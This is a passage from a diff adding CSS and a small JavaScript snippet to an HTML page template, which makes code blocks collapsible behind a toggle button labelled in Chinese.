+</script>
+<style>
+.article-content .highlight-wrap {
+  position: relative;
+  overflow: hidden;
+  border-radius: var(--card-border-radius);
+}
+.article-content .highlight-wrap .highlight {
+  margin:0;
+}
+ 
+.article-content .highlight-wrap.collapse {
+  max-height: 380px;
+}
+ 
+.article-content .highlight-wrap.collapse::after {
+  content: "";
+  position: absolute;
+  left:0;
+  bottom:0;
+  width:100%;
+  height: 80px;
+  background: linear-gradient(transparent, var(--pre-background-color));
+  pointer-events: none;
+}
+ 
+.article-content .code-expand-btn {
+  position:absolute;
+  bottom:8px;
+  right:12px;
+  z-index:2;
+  border: none;
+  padding: 4px 8px;
+  border-radius: 6px;
+  background: var(--card-background);
+  color: var(--text-color);
+  cursor: pointer;
+}
+</style>
+<script>
+document.addEventListener('DOMContentLoaded', ()=>{
+  document.querySelectorAll('.highlight-wrap').forEach(wrap=>{
+    const btn = wrap.querySelector('.code-expand-btn');
+    btn.addEventListener('click', ()=>{
+      wrap.classList.toggle('collapse');
+      btn.innerText = wrap.classList.contains('collapse') ? "▼ 展开" : "▲ 收起";
+    })
+  })
+})
+</script>
+
+    </body>
+</html>
